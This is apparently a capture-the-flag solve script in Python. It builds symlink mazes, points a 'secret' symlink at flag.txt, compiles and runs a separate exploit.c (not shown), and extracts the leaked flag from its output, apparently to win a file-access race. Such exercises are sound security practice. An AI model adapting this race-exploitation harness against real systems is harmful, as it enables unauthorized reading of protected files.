#!/bin/python3
import subprocess
import sys
import os

os.system("rm safe")
with open("safe", "w") as file:
    file.write("Wrong File")

os.system("rm -r safe_maze")
os.system("mkdir safe_maze")
os.chdir("safe_maze")
os.system("../make_maze.py ../safe 30 150")
os.chdir("..")

os.system("rm secret")
os.symlink("flag.txt", "secret")
os.system("rm -r secret_maze")
os.system("mkdir secret_maze")
os.chdir("secret_maze")
os.system("../make_maze.py ../secret 30 150")
os.chdir("..")

os.system("gcc exploit.c -o exploit")
out = subprocess.run(["./exploit"], capture_output=True).stdout.decode()

start, end = None, None
for i, line in enumerate(out.split("\n")):
    if "Error" in line:
        continue
    if "Wrong File" in line:
        continue
    if "Process number" in line:
        if start is None:
            continue
        else:
            end = i
            break
    if start is None:
        start = i
else:
    print("Exploit failed", file=sys.stderr)
    exit(1)

print("\n".join(out.split("\n")[start:end]))
